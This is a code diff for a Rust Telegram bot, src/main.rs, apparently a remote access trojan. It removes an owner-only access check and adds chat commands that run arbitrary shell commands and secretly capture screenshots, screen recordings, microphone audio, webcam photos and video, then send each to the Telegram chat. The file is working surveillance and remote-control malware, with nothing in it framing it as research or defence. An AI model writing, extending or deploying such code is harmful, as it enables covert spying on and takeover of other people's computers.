@@ -1,28 +1,125 @@
+// src/main.rs
+
 use teloxide::prelude::*;
-use std::collections::{HashMap, HashSet};
-use std::sync::{Arc, Mutex};
-use std::time::SystemTime;
+use teloxide::types::InputFile;
+use std::str::FromStr;
 
-mod command_handlers;
-
-static OWNER_ID: i64 = 7660492768;
+mod audio;
+mod camera;
+mod execution;
+mod screen;
+mod screenshot;
+mod video;
 
 #[tokio::main]
 async fn main() {
-    let bot = Bot::from_env();
+    let bot = Bot::from_env(); // Load bot token from environment variable
+    teloxide::repl(bot, handle_message).await;
+}
 
-    // Shared state for authorized users and access logs
-    let authorized_users: Arc<Mutex<HashSet<i64>>> = Arc::new(Mutex::new(HashSet::new()));
-    let access_logs: Arc<Mutex<HashMap<i64, String>>> = Arc::new(Mutex::new(HashMap::new()));
+// Parse and execute commands
+async fn handle_message(bot: Bot, message: Message) -> ResponseResult<()> {
+    if let Some(text) = message.text() {
+        let args: Vec<&str> = text.split_whitespace().collect();
 
-    // Add the owner by default
-    authorized_users.lock().unwrap().insert(OWNER_ID);
-
-    // Pass the state to the bot handler
-    let handler = teloxide::repl_with_state(
-        bot,
-        (authorized_users, access_logs),
-        command_handlers::handle_message,
-    );
-    handler.await;
+        match args[0] {
+            "exe:" => {
+                if args.len() > 1 {
+                    let command = &args[1..].join(" ");
+                    let output = execution::execute_command(command);
+                    bot.send_message(message.chat.id, output).await?;
+                } else {
+                    bot.send_message(message.chat.id, "Usage: exe: <command>").await?;
+                }
+            }
+            "ss:" => {
+                match screenshot::capture_screenshot() {
+                    Ok(file_path) => {
+                        bot.send_photo(message.chat.id, InputFile::file(file_path))
+                            .await?;
+                    }
+                    Err(e) => {
+                        bot.send_message(message.chat.id, format!("Error: {}", e))
+                            .await?;
+                    }
+                }
+            }
+            "screen_record:" => {
+                if args.len() == 2 {
+                    if let Ok(seconds) = u32::from_str(args[1]) {
+                        match screen::record_screen(seconds) {
+                            Ok(file_path) => {
+                                bot.send_video(message.chat.id, InputFile::file(file_path))
+                                    .await?;
+                            }
+                            Err(e) => {
+                                bot.send_message(message.chat.id, format!("Error: {}", e))
+                                    .await?;
+                            }
+                        }
+                    } else {
+                        bot.send_message(message.chat.id, "Invalid duration").await?;
+                    }
+                } else {
+                    bot.send_message(message.chat.id, "Usage: screen_record: <seconds>").await?;
+                }
+            }
+            "audio_record:" => {
+                if args.len() == 2 {
+                    if let Ok(seconds) = u32::from_str(args[1]) {
+                        match audio::record_audio(seconds) {
+                            Ok(file_path) => {
+                                bot.send_audio(message.chat.id, InputFile::file(file_path))
+                                    .await?;
+                            }
+                            Err(e) => {
+                                bot.send_message(message.chat.id, format!("Error: {}", e))
+                                    .await?;
+                            }
+                        }
+                    } else {
+                        bot.send_message(message.chat.id, "Invalid duration").await?;
+                    }
+                } else {
+                    bot.send_message(message.chat.id, "Usage: audio_record: <seconds>").await?;
+                }
+            }
+            "photo:" => {
+                match camera::capture_photo() {
+                    Ok(file_path) => {
+                        bot.send_photo(message.chat.id, InputFile::file(file_path))
+                            .await?;
+                    }
+                    Err(e) => {
+                        bot.send_message(message.chat.id, format!("Error: {}", e))
+                            .await?;
+                    }
+                }
+            }
+            "video_record:" => {
+                if args.len() == 2 {
+                    if let Ok(seconds) = u32::from_str(args[1]) {
+                        match video::record_video(seconds) {
+                            Ok(file_path) => {
+                                bot.send_video(message.chat.id, InputFile::file(file_path))
+                                    .await?;
+                            }
+                            Err(e) => {
+                                bot.send_message(message.chat.id, format!("Error: {}", e))
+                                    .await?;
+                            }
+                        }
+                    } else {
+                        bot.send_message(message.chat.id, "Invalid duration").await?;
+                    }
+                } else {
+                    bot.send_message(message.chat.id, "Usage: video_record: <seconds>").await?;
+                }
+            }
+            _ => {
+                bot.send_message(message.chat.id, "Unknown command.").await?;
+            }
+        }
+    }
+    Ok(())
 }
